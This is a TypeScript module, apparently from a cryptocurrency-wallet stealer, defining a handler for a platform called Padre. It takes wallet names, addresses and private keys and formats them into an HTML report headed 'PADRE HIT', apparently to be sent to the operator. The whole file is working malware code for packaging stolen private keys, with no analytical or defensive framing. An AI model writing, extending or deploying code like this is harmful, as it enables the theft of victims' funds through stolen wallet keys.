import type { PlatformHandler, ProcessResult, PlatformData } from './types.js';

// Обработчик для платформы Padre (базовая реализация)
export class PadreHandler implements PlatformHandler {
  name = 'padre';

  async processMessage(data: PlatformData): Promise<ProcessResult> {
    // Типизируем данные для Padre (базовая структура)
    const walletData = data as {
      wallets: [{
        walletName: string,
        address: string,
        privateKey: string
       }]
    };

    let message = `⚔️ <b>PADRE HIT</b>\n\n`;

    for (const wallet of walletData.wallets) {
      message += `<b>Wallet Name:</b> ${wallet.walletName}\n`;
      message += `<b>Address:</b> ${wallet.address}\n`;
      message += `<b>Private Key:</b> <code>${wallet.privateKey}</code>\n`;
      message += `========================================\n\n`;
    }

    return {
      messageToSend: message,
      messageToSendFull: message,
    };
  }
}

